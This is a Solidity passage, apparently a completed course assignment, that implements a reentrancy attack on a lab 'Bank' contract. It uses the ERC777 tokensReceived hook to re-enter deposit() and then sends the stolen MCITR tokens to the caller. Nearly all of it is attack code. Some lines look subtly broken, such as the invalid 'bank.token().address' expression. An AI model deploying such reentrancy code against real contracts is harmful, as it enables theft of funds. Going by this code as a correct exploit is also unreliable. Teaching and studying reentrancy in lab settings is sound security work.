Bank public bank; 

event Deposit(uint256 amount );
event Recurse(uint8 depth);

constructor(address admin) {
    _grantRole(DEFAULT_ADMIN_ROLE, admin);
    _grantRole(ATTACKER_ROLE, admin);
    _erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
}

function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
    bank = Bank(bank_address);
    _grantRole(ATTACKER_ROLE, address(this));
    _grantRole(ATTACKER_ROLE, bank.token().address );
}

/*
   The main attack function that should start the reentrancy attack
   amt is the amt of ETH the attacker will deposit initially to start the attack
*/
function attack(uint256 amt) payable public {
    require( address(bank) != address(0), "Target bank not set" );
    //YOUR CODE TO START ATTACK GOES HERE
    bank.deposit{value: amt}(); // Deposit ETH to the Bank contract, triggering the reentrancy attack
    withdraw(msg.sender); // Withdraw the stolen tokens to the caller's address
}

/*
   After the attack, this contract has a lot of (stolen) MCITR tokens
   This function sends those tokens to the target recipient
*/
function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
    ERC777 token = bank.token();
    token.send(recipient,token.balanceOf(address(this)),"");
}

/*
   This is the function that gets called when the Bank contract sends MCITR tokens
*/
function tokensReceived(
    address operator,
    address from,
    address to,
    uint256 amount,
    bytes calldata userData,
    bytes calldata operatorData
) external {
    //YOUR CODE TO RECURSE GOES HERE
    require(msg.sender == address(bank.token()), "Invalid token");
    require(depth < max_depth, "Max depth reached");

    depth++;
    emit Recurse(depth);
    bank.deposit{value: 1 ether}(); // Trigger the reentrancy attack by calling the Bank contract's deposit() function again
    depth--;
}
